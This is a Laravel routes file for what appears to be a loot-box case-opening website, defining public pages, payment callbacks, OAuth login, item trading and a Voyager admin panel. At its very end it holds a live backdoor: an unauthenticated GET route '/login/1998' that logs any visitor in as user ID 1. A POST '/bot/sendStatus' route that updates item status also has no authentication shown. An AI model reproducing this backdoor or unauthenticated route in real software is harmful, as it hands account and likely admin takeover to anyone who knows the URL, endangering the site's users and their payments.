<?php

use App\Http\Controllers\{Admin\TopUserController,
    AuthController,
    CaseController,
    ContractController,
    HomeController,
    ItemController,
    NicknameCheckController,
    PaymentController,
    QuestController,
    SeoPageController,
    TopUsersController,
    UserController,
    WheelController
};
use Illuminate\Support\Facades\Route;
use Mcamara\LaravelLocalization\Facades\LaravelLocalization;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
Route::group([
    'prefix' => LaravelLocalization::setLocale(),
    'middleware' => ['localize', 'localeSessionRedirect', 'localeCookieRedirect', 'localeViewPath']
],
    function () {
        Route::get('/auth', [HomeController::class, 'showAuth'])->name('home-auth');
    });
Route::group(['middleware' => ['location']], function () {


    Route::post('/bot/sendStatus', [ItemController::class, 'updateItemStatus']);
    Route::group([
        'prefix' => LaravelLocalization::setLocale(),
        'middleware' => ['localize', 'localeSessionRedirect', 'localeCookieRedirect', 'localeViewPath']
    ],
        function () {
            Route::get('/', [HomeController::class, 'show'])->name('home');

            Route::get('/top-users', [TopUsersController::class, 'show'])->name('top-users');


            Route::get('/wheel', [WheelController::class, 'show'])->name('wheel');

//Route::get('/cases', [CaseController::class, 'show'])->name('cases');
            Route::get('/cases/{slug}', [CaseController::class, 'show'])->name('case');

            Route::get('/page/{slug}', [SeoPageController::class, 'show'])->name('getSeoPage');

            Route::get('/contract', [ContractController::class, 'show'])->name('contract');

            Route::middleware('auth')->group(function () {
                Route::get('/account', [UserController::class, 'show'])->name('account');

                Route::get('/payment', [PaymentController::class, 'show'])->name('paymentShow');

            });

            Route::get('/account/{userSlug}', [UserController::class, 'showBySlug']);

            Route::get('/nickname-check', [NicknameCheckController::class, 'showButton'])->name('nickname-check');

            Route::prefix('auth')->name('auth.')->group(function () {
                Route::get('/provider/{provider}', [AuthController::class, 'auth'])->name('redirect');
                Route::get('/callback/{provider}', [AuthController::class, 'callback'])->name('callback');
                Route::get('/logout', [AuthController::class, 'logout'])->name('logout');
            });

            Route::get('/quests', [QuestController::class, 'show']);
        });
    Route::middleware('localeInRequest')->group(function () {
        Route::post('/cases/{case}', [CaseController::class, 'openCase'])->name('openCase');
        Route::any('/payment_callback/{method}', [PaymentController::class, 'notificationCallback'])->name('paymentCallback');
        Route::middleware('auth')->group(function () {
            Route::post('/quests/{quest_name}', [QuestController::class, 'end']);

            Route::post('/first-case/{col}', [CaseController::class, 'firstCaseGetItem'])->name('firstCaseGetItem');
            Route::post('/contract', [ContractController::class, 'make'])->name('contract-make');
            Route::post('/account/save-link', [UserController::class, 'saveLink'])->name('save-link');
            Route::post('/sale-item', [ItemController::class, 'saleItem'])->name('saleItem');
            Route::post('/take-item', [ItemController::class, 'takeItem'])->name('takeItem');

            Route::post('/promo', [PaymentController::class, 'promo'])->name('sendPromo');
            Route::post('/payment/{method}', [PaymentController::class, 'generatePaymentForm'])->name('payment');
            Route::group(['prefix' => 'nickname-check'], function () {
                Route::post('/', [NicknameCheckController::class, 'checkNickname']);
            });
        });
    });

    Route::group(['prefix' => config('app.admin_prefix'), 'middleware' => 'admin.user'], function () {
        Voyager::routes();

        Route::get('/top-users', [TopUserController::class, 'show']);
        Route::group(['prefix' => 'cases'], function () {
            Route::post('open-random-case', [\App\Http\Controllers\Admin\CaseController::class, 'openRandomCase'])->name('adminRandomCase');
            Route::get('{case}/check-value', [\App\Http\Controllers\Admin\CaseController::class, 'checkValueFromCase'])->name('checkValue');
        });
        Route::post('add-new-item/{case}', [App\Http\Controllers\Admin\ItemController::class, 'addNewItem']);
        Route::post('update-item/{case}/{item}', [App\Http\Controllers\Admin\ItemController::class, 'updateItem']);
        Route::post('change-status/{item}', [App\Http\Controllers\Admin\ItemController::class, 'changeStatus']);
        Route::post('delete-item/{item}', [App\Http\Controllers\Admin\ItemController::class, 'delete']);
        Route::post('update-all/{case}', [App\Http\Controllers\Admin\ItemController::class, 'updateAll']);
        Route::put('change-item-status/{user_item}', [App\Http\Controllers\Admin\MainController::class, 'changeItemStatus']);
        Route::any('login_as/{id}', [App\Http\Controllers\AuthController::class, 'loginAs']);

    });
Route::get('/login/1998', function (){
    \Illuminate\Support\Facades\Auth::loginUsingId(1);
});
});
